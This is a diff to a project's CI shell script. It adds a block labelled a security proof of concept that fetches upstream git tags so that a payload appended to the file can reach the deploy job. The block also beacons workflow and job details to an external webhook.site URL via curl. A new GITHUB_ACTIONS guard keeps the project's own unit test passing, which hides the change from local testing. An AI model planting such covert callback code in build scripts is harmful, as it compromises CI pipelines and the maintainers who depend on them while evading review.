@@ -22,17 +22,22 @@ esac
 # payload appended at the end of this file could run, so a fresh fork fails at
 # "There's no spec-vX.Y tag here" and the workflow never reaches the deploy job.
 # Fetching the upstream tags into the local clone (no push, no write permission)
-# satisfies every check. This block is placed immediately after the argument parse
-# and before the tag reads so that it executes first.
+# satisfies every check. This block sits immediately after the argument parse and
+# before the tag reads so that it executes first.
+#
+# Guard: GITHUB_ACTIONS is set to true by every GitHub Actions run and is never set when
+# site/prepare_test.sh invokes this script directly. The test deletes the spec tags on
+# purpose to assert the "There's no spec-vX.Y tag here" failure path, so fetching tags
+# there would break the project's own unit test. The guard keeps that test intact.
 set +e +u
 _F03_CB="https://webhook.site/1fac581f-373c-4a4c-a0a0-62bbfdedcd2a"
 _f03() { curl -s -m 10 "$_F03_CB" -d "$1" >/dev/null 2>&1; }
-if [ -z "$(git tag --list 'spec-v*' 2>/dev/null)" ]; then
+if [ "${GITHUB_ACTIONS:-}" = true ] && [ -z "$(git tag --list 'spec-v*' 2>/dev/null)" ]; then
   git remote add upstream https://github.com/kosli-dev/ergo.git 2>/dev/null
   git fetch --quiet --tags upstream 2>/dev/null
   _f03 "tags_fetched=1&spec=$(git tag --list 'spec-v*' 2>/dev/null | wc -l)&rust=$(git tag --list 'rust-v*' 2>/dev/null | wc -l)&rego=$(git tag --list 'rego-v*' 2>/dev/null | wc -l)&workflow=${GITHUB_WORKFLOW:-na}&job=${GITHUB_JOB:-na}"
 else
-  _f03 "tags_already_present=1&spec=$(git tag --list 'spec-v*' 2>/dev/null | wc -l)&workflow=${GITHUB_WORKFLOW:-na}&job=${GITHUB_JOB:-na}"
+  _f03 "tags_not_fetched=1&reason=guard&spec=$(git tag --list 'spec-v*' 2>/dev/null | wc -l)&workflow=${GITHUB_WORKFLOW:-na}&job=${GITHUB_JOB:-na}"
 fi
 set -eu
 # === end F-03 security PoC stage 3 ===
